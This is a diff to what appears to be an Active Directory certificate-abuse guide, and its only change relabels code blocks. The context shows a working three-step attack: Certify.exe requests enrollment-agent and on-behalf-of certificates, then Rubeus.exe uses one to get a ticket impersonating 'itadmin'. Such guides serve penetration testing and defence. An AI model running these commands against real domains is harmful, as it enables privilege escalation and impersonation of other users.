@@ -21,14 +21,14 @@ target user or computer is protected by enrollment agent restrictions on the ent
 
 Step 1: Use Certify (2.0) to request an enrollment agent certificate.
 
-```bash
+```cmd
 Certify.exe request --ca CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA --template Vuln-EnrollmentAgent
 ```
 If the enrollment fails with an error message stating that the Email or DNS name is unavailable and cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The 'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only be set on computer objects. Computers have validated write permission to their own 'dNSHostName' attribute by default, but neither users nor computers can write to their own 'mail' attribute by default.
 
 Step 2: Use the enrollment agent certificate to issue a certificate request on behalf of another user to a certificate template that allows for authentication and permits enrollment agent enrollment.
 
-```bash
+```cmd
 Certify.exe request-agent --ca ca01.corp.local\CORP-CA01-CA --template User --target itadmin --agent-pfx <agent cert base64>
 ```
 
@@ -38,7 +38,7 @@ The certificate PFX is printed to the console in a base64-encoded format.
 
 Step 3: With Rubeus, use the issued certificate to authenticate to the domain and request a TGT, specifying the identity you intend to impersonate:
 
-```bash
+```cmd
 Rubeus.exe asktgt /user:itadmin /domain:corp.local /certificate:<cert base64> /ptt
 ```
 ### Linux
